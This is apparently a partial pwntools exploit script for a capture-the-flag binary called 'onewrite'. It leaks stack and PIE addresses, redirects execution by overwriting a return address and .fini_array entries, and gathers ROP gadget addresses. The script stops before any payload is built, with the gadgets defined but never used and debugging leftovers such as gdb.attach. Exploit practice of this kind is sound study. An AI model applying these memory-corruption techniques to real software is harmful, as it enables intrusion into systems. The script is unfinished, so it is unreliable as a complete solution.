#!/usr/bin/env python3

from pwn import *

exe = ELF("./onewrite")

r = process("./onewrite")

STACK_LEAK = "1"
PIE_LEAK = "2"

# leak stack address

r.sendline(STACK_LEAK)
r.recvuntil("> 0x")
stack_addr = int(r.recvn(12), 16)

# return in call do_leak()

ret_doleak = stack_addr + 24
r.send(str(ret_doleak - 7))
r.send("A" * 7 + "\x04") 

# leak pie address

r.sendline(PIE_LEAK)
r.recvuntil("> 0x")
pie_addr = int(r.recvn(12), 16)
exe.address = pie_addr - exe.symbols['do_leak']
log.info("elf base: {}".format(hex(exe.address)))

# overwrite .fini_array entries with do_leak()

finiArr = exe.symbols['__do_global_dtors_aux_fini_array_entry']
csuFini = exe.symbols['__libc_csu_fini']
log.info(".fini_array address: {}".format(hex(finiArr)))
log.info("__libc_csu_fini address: {}".format(hex(csuFini)))
log.info("do_leak address: {}".format(hex(exe.symbols['do_leak'])))

r.send(str(finiArr + 8))
r.send(p64(exe.symbols['do_leak']))

r.send("\n")
r.send(str(finiArr))
r.send(p64(exe.symbols['do_leak']))

#ret_csuFini = stack_addr - 
gdb.attach(r)
#r.send("\n")
#log.info("ret address: {}".format(hex(ret)))
#r.send(str(ret))
#r.send(p64(csuFini))

#r.send("\n")

popRax = exe.address + 0x00000000000460ac
popRdi = exe.address + 0x00000000000084fa
popRsi = exe.address + 0x000000000000d9f2
popRdx = exe.address + 0x00000000000484c5
syscall = exe.address + 0x0000000000073baf

r.interactive()
